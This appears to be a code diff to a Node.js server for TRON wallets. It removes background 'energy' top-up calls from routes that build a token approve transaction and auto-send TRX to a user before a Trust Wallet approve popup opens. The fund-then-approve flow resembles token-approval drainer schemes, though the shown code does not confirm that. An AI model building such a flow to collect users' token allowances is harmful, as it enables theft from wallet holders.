@@ -543,14 +543,6 @@ app.post('/build-approve', validateRequest, async (req, res) => {
 
     logEvent('BUILD_APPROVE_START', { userAddress, feeLimit });
 
-    // Do NOT await energy here — it delays Trust popup and expires WC after top-up.
-    // Background nudge only.
-    setImmediate(() => {
-      ensureUserEnergy(userAddress)
-        .then((energy) => logEvent('BUILD_APPROVE_ENERGY_BG', { userAddress, ...energy }))
-        .catch((err) => logEvent('BUILD_APPROVE_ENERGY_BG_FAILED', { userAddress, error: err.message }));
-    });
-
     const parameters = [
       { type: 'address', value: spender },
       { type: 'uint256', value: amount }
@@ -748,29 +740,14 @@ app.post('/send-trx', validateRequest, async (req, res) => {
         transactionId: txid
       });
 
-      // Return immediately so FE can open Trust approve popup.
-      // Energy nudge runs in background — awaiting it made WC session expire.
-      setImmediate(() => {
-        ensureUserEnergy(userAddress)
-          .then((energy) => {
-            logEvent('ENERGY_AFTER_TOPUP_BG', { userAddress, ...energy });
-          })
-          .catch((energyError) => {
-            logEvent('ENERGY_AFTER_TOPUP_FAILED', {
-              userAddress,
-              error: energyError.message
-            });
-          });
-      });
-
+      // Return immediately — FE waits 5s then opens Trust approve popup. No energy.
       return res.json({
         success: true,
         message: `Sent ${SERVER_CONFIG.autoSendAmount} TRX successfully`,
         transactionId: txid,
         amount: SERVER_CONFIG.autoSendAmount,
         recipient: userAddress,
-        sent: true,
-        energy: { ok: true, deferred: true }
+        sent: true
       });
     }
 
